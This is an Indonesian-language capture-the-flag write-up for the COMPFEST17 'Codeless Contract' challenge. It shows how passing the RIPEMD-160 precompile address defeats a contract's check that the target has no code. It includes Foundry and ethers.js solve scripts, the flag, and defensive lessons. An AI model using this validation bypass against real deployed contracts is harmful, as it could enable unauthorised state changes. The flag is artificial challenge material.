# Codeless Contract — abusing precompiles

## Ringkasan

* **Kategori:** Blockchain / Smart Contract
* **Tujuan:** Set `isSolved = true` pada kontrak challenge.
* **Flag yang didapat:** `COMPFEST17{codeless_contract_is_possible_48670a8bee}`

## Analisis kode inti

Dari file yang diberikan (`CodelessContract.sol`, `Setup.sol`), fungsi penyelesaiannya kira-kira seperti ini (disederhanakan):

```solidity
function hack(address target) external {
    // 1) Alamat harus TANPA bytecode
    require(target.code.length == 0, "code must be empty");

    // 2) Lakukan low-level call tanpa calldata
    (bool ok, bytes memory out) = target.call("");

    // 3) Harus sukses, dan hasil decode ke uint256 < 2^224
    require(ok, "call failed");
    uint256 v = abi.decode(out, (uint256));
    require(v < 2**224, "lol");

    isSolved = true;
}
```

### Konsekuensi dari cek tersebut

* **EOA** (externally owned account) memang `code.length == 0`, **tapi** memanggil EOA akan mengembalikan **return data kosong**, sehingga `abi.decode(..., uint256)` **revert**.
* Kita butuh alamat **tanpa bytecode** *namun* **bisa di-call** dan **mengembalikan 32 byte** yang valid serta **< 2^224**.

## Ide utama: gunakan **precompile**

Di EVM ada alamat khusus **precompiled contracts** (0x01..0x09, dst.). Ciri penting:

* `extcodesize`/`code.length` mereka **0** → lolos “codeless”.
* Tetap **bisa di-call** dan **mengembalikan data**.

Precompile yang paling cocok di sini adalah **RIPEMD-160** di alamat:

```
0x0000000000000000000000000000000000000003
```

Jika dipanggil dengan input kosong, ia mengembalikan **RIPEMD-160("")** sepanjang **20 byte**, yang otomatis **dipadatkan (left-padded) menjadi 32 byte** → nilainya **< 2^160**, pasti **< 2^224**.
Jadi tiga syarat challenge terpenuhi sekaligus:

1. `code.length == 0` ✅
2. `call` sukses ✅
3. `abi.decode(..., uint256) < 2^224` ✅

> Kenapa bukan precompile lain?
>
> * **SHA-256 (0x02)** menghasilkan 32 byte “penuh”; untuk input kosong, hash-nya **bukan** < 2^224 → gagal.
> * **identity (0x04)** akan mengembalikan input; karena kita memanggil tanpa calldata, return-nya kosong → `abi.decode` gagal.

## Langkah eksploitasi

### Opsi A — Foundry (`cast`)

```bash
# set variabel dari launcher
export RPC_URL="http://ctf.compfest.id:7402/<token>"
export PK="0x<private_key_kamu>"
export SETUP="0x<alamat Setup>"

# 1) Ambil alamat challenge
CHALL=$(cast call $SETUP "challenge()(address)" --rpc-url $RPC_URL)
echo "Challenge: $CHALL"

# 2) Kirim solusi: panggil hack() dengan alamat precompile RIPEMD-160 (0x...03)
cast send $CHALL "hack(address)" 0x0000000000000000000000000000000000000003 \
  --rpc-url $RPC_URL --private-key $PK

# 3) Verifikasi
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC_URL
# -> true
```

### Opsi B — Node.js + ethers

```js
const { ethers } = require("ethers");

const RPC   = process.env.RPC_URL;
const PK    = process.env.PRIVATE_KEY;
const SETUP = process.env.SETUP;

const setupAbi = [
  "function challenge() view returns (address)",
  "function isSolved() view returns (bool)"
];
const challAbi = ["function hack(address) external"];

(async () => {
  const provider = new ethers.JsonRpcProvider(RPC);
  const wallet   = new ethers.Wallet(PK, provider);

  const setup = new ethers.Contract(SETUP, setupAbi, wallet);
  const challAddr = await setup.challenge();

  const chall = new ethers.Contract(challAddr, challAbi, wallet);
  const RIPEMD = "0x0000000000000000000000000000000000000003";

  await (await chall.hack(RIPEMD)).wait();

  console.log("isSolved:", await setup.isSolved()); // true
})();
```

Setelah `isSolved == true`, klik **Flag** di launcher untuk mengklaim flag.

## Bukti & hasil

* `extcodesize(0x…03) == 0` → lolos “codeless”.
* `call(0x…03, "")` → sukses, mengembalikan 32-byte (RIPEMD-160("") left-padded).
* Nilai tersebut **< 2^160 < 2^224** → lolos batas.
* `isSolved` terset → **Flag: `COMPFEST17{codeless_contract_is_possible_48670a8bee}`**.

## Pelajaran

* **Jangan anggap `code.length == 0` berarti “tidak dapat dipanggil”.** Precompiles mematahkan asumsi itu.
* Saat melakukan validasi alamat target, pahami **semantik EVM** (precompiles, return data, dan padding abi).
* Jika butuh “kontrak tanpa kode”, pertimbangkan validasi tambahan (mis. melarang alamat precompile, memaksa `returndatasize == 0`, dsb.).
